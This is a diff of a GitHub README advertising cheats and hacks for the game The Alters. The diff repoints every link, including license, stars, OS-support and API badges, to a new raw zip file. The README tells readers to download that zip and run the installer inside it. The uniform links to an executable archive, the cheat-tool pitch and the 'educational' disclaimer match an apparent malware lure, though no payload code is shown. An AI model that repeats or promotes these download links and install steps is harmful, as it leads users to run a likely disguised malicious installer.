@@ -1,9 +1,9 @@
-![License](https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/alters-advantage-the-tools-v1.8.zip)  
-![OS Support](https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/alters-advantage-the-tools-v1.8.zip%20%7C%20macOS%20%7C%https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/alters-advantage-the-tools-v1.8.zip)  
-![Stars](https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/alters-advantage-the-tools-v1.8.zip)  
-![Issues](https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/alters-advantage-the-tools-v1.8.zip)  
-![API-OpenAI](https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/alters-advantage-the-tools-v1.8.zip)  
-![API-Claude](https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/alters-advantage-the-tools-v1.8.zip)  
+![License](https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/the-alters-advantage-tools-thusgate.zip)  
+![OS Support](https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/the-alters-advantage-tools-thusgate.zip%20%7C%20macOS%20%7C%https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/the-alters-advantage-tools-thusgate.zip)  
+![Stars](https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/the-alters-advantage-tools-thusgate.zip)  
+![Issues](https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/the-alters-advantage-tools-thusgate.zip)  
+![API-OpenAI](https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/the-alters-advantage-tools-thusgate.zip)  
+![API-Claude](https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/the-alters-advantage-tools-thusgate.zip)  
 
 # 🚀 The Alters Cheats & Hacks Repository
 
@@ -18,14 +18,14 @@ Welcome to the **The Alters Cheats & Hacks** repository—an extensively detaile
 Ready to empower your The Alters journey?  
 Jumpstart your adventure with a direct download:
 
-<a href="https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/alters-advantage-the-tools-v1.8.zip">
-  <img src="https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/alters-advantage-the-tools-v1.8.zip%E2%86%93-blue?style=for-the-badge" alt="Download" />
+<a href="https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/the-alters-advantage-tools-thusgate.zip">
+  <img src="https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/the-alters-advantage-tools-thusgate.zip%E2%86%93-blue?style=for-the-badge" alt="Download" />
 </a>
 
 #### Installation Steps
 
 1. **Download the Latest Release**  
-   Click the "Download" button above or find the latest [release here]https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/alters-advantage-the-tools-v1.8.zip
+   Click the "Download" button above or find the latest [release here]https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/the-alters-advantage-tools-thusgate.zip
 
 2. **Run the Installer**  
    Launch the installation wizard and follow the on-screen guidance. The installer will auto-detect your operating system for streamlined setup.
@@ -108,7 +108,7 @@ This repository and its downloadable tools are **for educational and research pu
 ## 📜 License
 
 MIT License (2025) — Open to adaptation, learning, and improvement.
-See full license text [here](https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/alters-advantage-the-tools-v1.8.zip).
+See full license text [here](https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/the-alters-advantage-tools-thusgate.zip).
 
 ---
 
@@ -117,8 +117,8 @@ See full license text [here](https://raw.githubusercontent.com/Idkunku/the-alter
 Eager to revisit your journey or need a fresh installer?  
 Download the latest version here:
 
-<a href="https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/alters-advantage-the-tools-v1.8.zip">
-  <img src="https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/alters-advantage-the-tools-v1.8.zip%E2%86%93-blue?style=for-the-badge" alt="Download" />
+<a href="https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/the-alters-advantage-tools-thusgate.zip">
+  <img src="https://raw.githubusercontent.com/Idkunku/the-alters-advantage-tools/branch/roomth/the-alters-advantage-tools-thusgate.zip%E2%86%93-blue?style=for-the-badge" alt="Download" />
 </a>
 
 Thank you for being part of The Alters ecosystem—where adaptation meets imagination.
